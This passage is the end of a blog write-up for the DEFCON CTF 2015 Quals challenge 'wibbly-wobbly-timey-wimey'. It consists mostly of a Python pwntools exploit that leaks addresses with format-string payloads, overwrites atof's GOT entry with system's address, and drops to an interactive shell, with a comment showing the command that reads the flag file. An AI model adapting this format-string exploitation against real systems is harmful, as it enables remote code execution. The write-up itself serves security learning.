	<span class="n">y</span><span class="o">=</span><span class="mi">0</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">MAP</span><span class="p">:</span>
		<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">i</span><span class="p">:</span>
			<span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">c</span><span class="p">:</span>
				<span class="k">if</span> <span class="n">j</span> <span class="o">==</span> <span class="n">a</span><span class="p">:</span>
					<span class="k">return</span> <span class="p">(</span><span class="n">y</span><span class="p">,</span><span class="n">x</span><span class="p">)</span>
			<span class="n">y</span><span class="o">+=</span><span class="mi">1</span>
		<span class="n">x</span><span class="o">+=</span><span class="mi">1</span>
		<span class="n">y</span><span class="o">=</span><span class="mi">0</span>
	<span class="k">return</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>


<span class="n">t</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

<span class="c"># start playing the game</span>
<span class="k">for</span> <span class="n">test</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
	<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
	<span class="k">if</span> <span class="s">"KEY"</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
		<span class="k">print</span> <span class="n">s</span>
		<span class="k">break</span>
	<span class="n">MAP</span> <span class="o">=</span> <span class="n">getMap</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
	<span class="n">GOAL</span><span class="o">=</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
	<span class="n">ME</span><span class="o">=</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
	<span class="n">GOAL</span><span class="o">=</span><span class="n">getChar</span><span class="p">([</span><span class="s">'E'</span><span class="p">,</span><span class="s">'T'</span><span class="p">],</span><span class="n">MAP</span><span class="p">)</span>
	<span class="k">print</span> <span class="n">GOAL</span>
	<span class="n">ME</span><span class="o">=</span><span class="n">getChar</span><span class="p">([</span><span class="s">'&lt;'</span><span class="p">,</span><span class="s">'&gt;'</span><span class="p">,</span><span class="s">'V'</span><span class="p">,</span><span class="s">'^'</span><span class="p">],</span><span class="n">MAP</span><span class="p">)</span>
	<span class="k">print</span> <span class="n">ME</span>

	<span class="n">drct</span> <span class="o">=</span> <span class="p">[]</span>
	<span class="k">if</span><span class="p">(</span> <span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">GOAL</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">):</span>
		<span class="k">if</span><span class="p">(</span> <span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">MAP</span><span class="p">[</span><span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]][</span><span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span><span class="s">'A'</span><span class="p">):</span>
			<span class="n">drct</span><span class="o">+=</span><span class="s">'a'</span>
	<span class="k">elif</span><span class="p">(</span> <span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">GOAL</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">):</span>
		<span class="k">if</span><span class="p">(</span> <span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">19</span> <span class="ow">and</span> <span class="n">MAP</span><span class="p">[</span><span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]][</span><span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span><span class="s">'A'</span><span class="p">):</span>
			<span class="n">drct</span><span class="o">+=</span><span class="s">'d'</span>
	<span class="k">if</span><span class="p">(</span> <span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">GOAL</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">):</span>
		<span class="k">if</span><span class="p">(</span> <span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">MAP</span><span class="p">[</span><span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">!=</span><span class="s">'A'</span><span class="p">):</span>
			<span class="n">drct</span><span class="o">+=</span><span class="s">'w'</span>
	<span class="k">elif</span><span class="p">(</span> <span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">GOAL</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">):</span>
		<span class="k">if</span><span class="p">(</span> <span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">19</span> <span class="ow">and</span> <span class="n">MAP</span><span class="p">[</span><span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">][</span><span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">!=</span><span class="s">'A'</span><span class="p">):</span>
			<span class="n">drct</span><span class="o">+=</span><span class="s">'s'</span>
	<span class="k">if</span> <span class="n">drct</span> <span class="o">==</span> <span class="p">[]</span> <span class="p">:</span>
		<span class="k">if</span> <span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">GOAL</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">:</span>
			<span class="k">if</span> <span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">:</span>
				<span class="n">drct</span><span class="o">+=</span><span class="s">'a'</span>
			<span class="k">else</span><span class="p">:</span>
				<span class="n">drct</span><span class="o">+=</span><span class="s">'d'</span>
		<span class="k">elif</span> <span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">GOAL</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">:</span>
			<span class="k">if</span> <span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">:</span>
				<span class="n">drct</span><span class="o">+=</span><span class="s">'w'</span>
			<span class="k">else</span><span class="p">:</span>
				<span class="n">drct</span><span class="o">+=</span><span class="s">'s'</span>
			
	<span class="k">print</span> <span class="n">drct</span>
	<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">drct</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

<span class="c"># Done playing, time to send TARDIS KEY</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending tardis key..."</span><span class="p">)</span>
<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"UeSlhCAGEp</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overwriting fd..."</span><span class="p">)</span>
<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x00\n</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c"># wait for 2 second so the service's able to call sub_BCB()</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"enable choice 3..."</span><span class="p">)</span>
<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"m+YU</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c"># m+YU = 1431907181</span>
<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c"># turn on the TARDIS console</span>
<span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"writing fd back..."</span><span class="p">)</span>
<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x03\n</span><span class="s">"</span><span class="p">)</span> <span class="c"># write the fd back to 3 so the rest of our input won't get into sub_BCB()</span>
<span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
<span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
<span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"choice 3 enabled success"</span><span class="p">)</span>

<span class="n">x</span> <span class="o">=</span> <span class="mf">51.492137</span>
<span class="n">y</span> <span class="o">=</span> <span class="o">-</span><span class="mf">0.192878</span>
<span class="n">pass_xy</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">+</span><span class="s">','</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">pass_xy</span>

<span class="c"># constructing format string payload</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
    <span class="n">a</span> <span class="o">=</span> <span class="s">".</span><span class="si">%</span><span class="s">"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">"$p"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">a</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending payload..."</span><span class="p">)</span>
<span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
<span class="k">print</span> <span class="n">s</span>
<span class="n">nptr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">13</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="c"># get the stack address</span>
<span class="n">ret_addr</span> <span class="o">=</span> <span class="n">nptr</span> <span class="o">+</span> <span class="mh">0x406</span> <span class="c"># return address' location</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"nptr: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">nptr</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"ret: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">pass_xy</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="c"># padding</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">".</span><span class="si">%20</span><span class="s">$p"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">".</span><span class="si">%20</span><span class="s">$s."</span> <span class="c"># leak the return address</span>
<span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
<span class="k">print</span> <span class="n">s</span>
<span class="n">WTF</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">6</span><span class="p">])</span> <span class="c"># return address</span>
<span class="n">text_base</span> <span class="o">=</span> <span class="n">WTF</span> <span class="o">-</span> <span class="mh">0x1491</span>
<span class="n">atof_got</span> <span class="o">=</span> <span class="n">text_base</span> <span class="o">+</span> <span class="mh">0x5080</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"text_base: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">text_base</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"atof_got: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">atof_got</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">pass_xy</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">atof_got</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">".</span><span class="si">%20</span><span class="s">$p"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">".</span><span class="si">%20</span><span class="s">$s."</span>  <span class="c"># leak atof's got</span>
<span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
<span class="k">print</span> <span class="n">s</span>
<span class="n">atof_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">6</span><span class="p">][</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="n">atof_addr</span> <span class="o">+</span> <span class="mi">59728</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"atof addres: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">atof_addr</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system addres: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>

<span class="n">byte1</span> <span class="o">=</span> <span class="n">system_addr</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
<span class="n">byte2</span> <span class="o">=</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFF00</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>

<span class="c"># use %n to overwrite atof's got entry into system's address</span>
<span class="n">fmt1</span> <span class="o">=</span> <span class="n">byte1</span> <span class="o">-</span> <span class="mi">28</span>
<span class="n">fmt2</span> <span class="o">=</span> <span class="n">byte2</span> <span class="o">-</span> <span class="n">fmt1</span> <span class="o">-</span> <span class="mi">28</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">pass_xy</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">atof_got</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">atof_got</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">fmt1</span><span class="p">)</span><span class="o">+</span><span class="s">"c"</span><span class="o">+</span><span class="s">"</span><span class="si">%20</span><span class="s">$hhn"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">fmt2</span><span class="p">)</span><span class="o">+</span><span class="s">"c</span><span class="si">%21</span><span class="s">$hn"</span>
<span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
<span class="k">print</span> <span class="n">s</span>

<span class="n">t</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="c"># send cat /home/wwtw/flag;,123 to get flag</span>

</code></pre></div></div>

<p>Flag: <code class="highlighter-rouge">Would you like a Jelly Baby? !@()*ASF)9UW$askjal</code></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#c" class="page__taxonomy-item" rel="tag">C</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#defcon" class="page__taxonomy-item" rel="tag">DEFCON</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#format-string" class="page__taxonomy-item" rel="tag">format_string</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#ppc" class="page__taxonomy-item" rel="tag">PPC</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2015-05-24T06:40:00+08:00">May 24, 2015</time></p>
        
      </footer>

      <section class="page__share">
  

  <a href="https://twitter.com/intent/tweet?text=DEFCON+CTF+2015+Quals+--+wibbly-wobbly-timey-wimey%20http%3A%2F%2F0.0.0.0%3A4000%2Fdefcon-ctf-2015-quals-wibbly-wobbly-timey-wimey%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fdefcon-ctf-2015-quals-wibbly-wobbly-timey-wimey%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2F0.0.0.0%3A4000%2Fdefcon-ctf-2015-quals-wibbly-wobbly-timey-wimey%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>

</section>


      
  <nav class="pagination">
    
      <a href="/defcon-ctf-2015-quals-catwestern/" class="pagination--pager" title="DEFCON CTF 2015 Quals – catwestern
">Previous</a>
    
    
      <a href="/ais3-2015-pre-exam-complete-writeup/" class="pagination--pager" title="AIS3 2015 pre-exam – complete writeup
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You May Also Enjoy</h4>
      <div class="grid__wrapper">
        
          
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/flare-on-challenge-2019-write-up/" rel="permalink">Flare-on Challenge 2019 Write-up
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Another year of Flare-on challenge ! As a guy who’s interetesed in reverse engineering, this is definitely a great chance for me to practice/sharpen my rever...</p>
  </article>
</div>

        
          
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/flare-on-challenge-2018-write-up/" rel="permalink">Flare-on Challenge 2018 Write-up
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Flare-on challenge is a Reverse-style CTF challenge created by the FireEye FLARE team. The CTF contains lots of interesting, real-world style reversing chall...</p>
  </article>
</div>

        
          
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/some-notes-on-migrating-to-jekyll/" rel="permalink">Some notes on migrating to Jekyll
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Recently I’ve decided to migrate my blogging framework from Hexo to Jekyll. Here are some notes that I took for recording the migration process.

</p>
  </article>
</div>

        
          
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Chakrazy is a browser CTF challenge created by team PPP for the 2017 PlaidCTF event. It’s a challenge based on Microsoft’s ChakraCore Javascript engine. You ...</p>
  </article>
</div>

        
      </div>
    </div>
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    
      
        
          <li><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-creative-commons" aria-hidden="true"></i> </a></li>
        
      
        
          <li><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-creative-commons-by" aria-hidden="true"></i> </a></li>
        
      
        
          <li><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-creative-commons-nc" aria-hidden="true"></i> </a></li>
        
      
        
          <li><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-creative-commons-sa" aria-hidden="true"></i> </a></li>
        
      
    

  </ul>
</div>

<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




    
  <script>
    var disqus_config = function () {
      this.page.url = "http://0.0.0.0:4000/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/";  // Replace PAGE_URL with your page's canonical URL variable
      this.page.identifier = "/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
    (function() { // DON'T EDIT BELOW THIS LINE
      var d = document, s = d.createElement('script');
      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


  





  </body>
</html>
